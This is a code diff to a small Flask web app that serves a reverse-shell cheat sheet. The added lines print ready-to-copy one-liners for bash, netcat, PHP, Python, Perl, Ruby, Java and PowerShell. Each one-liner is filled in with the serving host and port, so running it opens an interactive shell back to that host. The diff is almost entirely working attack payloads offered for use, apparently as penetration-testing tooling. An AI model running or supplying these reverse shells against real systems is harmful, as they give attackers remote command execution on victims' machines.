@@ -19,6 +19,8 @@ def create_app(test_config=None):
 
     @app.route('/')
     def help():
+        hostname = (request.host).split(':')[0]
+        rport = prefered_port
         return '''
     <html>
         <head>
@@ -29,14 +31,41 @@ def create_app(test_config=None):
             <h3>Reverse Shells</h3>
             <p>This site allows quick copy/paste / download of reverse shell commands</p>
             <ul>
-                <li><a href="/bash">bash</a></li>
-                <li><a href="/netcat">netcat</a></li>
-                <li><a href="/php">php</a></li>
-                <li><a href="/python">python</a></li>
-                <li><a href="/perl">perl</a></li>
-                <li><a href="/ruby">ruby</a></li>
-                <li><a href="/java">java</a></li>
-                <li><a href="/powershell">powershell</a></li>
+                <li><a href="/bash">bash</a>
+                <ul>
+                    bash -i >& /dev/tcp/''' + hostname + '/' + rport + ''' 0>&1
+                </ul>
+                </li>
+                <li><a href="/netcat">netcat</a><ul>
+                    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ''' + hostname + ' ' + rport + ''' >/tmp/f'
+                </ul>
+                </li>
+                <li><a href="/php">php</a><ul>
+                    php -r '$sock=fsockopen("''' + hostname + '''",''' + rport + ''');exec("/bin/sh -i <&3 >&3 2>&3");
+                </ul>
+                </li>
+                <li><a href="/python">python</a><ul>
+                    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'''+hostname+'''",'''+rport+'''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+                </ul>
+                </li>
+                <li><a href="/perl">perl</a><ul>
+                    perl -e 'use Socket;$i="'''+hostname+'''";$p='''+rport+''';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+                </ul>
+                </li>
+                <li><a href="/ruby">ruby</a><ul>
+                    ruby -rsocket -e'f=TCPSocket.open("'''+hostname+'''",'''+rport+''').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+                </ul>
+                </li>
+                <li><a href="/java">java</a><ul>
+                    r = Runtime.getRuntime()
+                    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'''+hostname+'''/'''+rport+''';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+                    p.waitFor()
+                </ul>
+                </li>
+                <li><a href="/powershell">powershell</a><ul>
+                    powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\''''+hostname+'''','''+rport+''');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'"
+                </ul>
+                </li>
             </ul>
             <p><b>e.g.</b><br /> <a href="''' + request.url + '''bash">''' + request.url + '''bash</a></p>
             <p>If you want to change that port simply add '/port' to the end of the url<p>
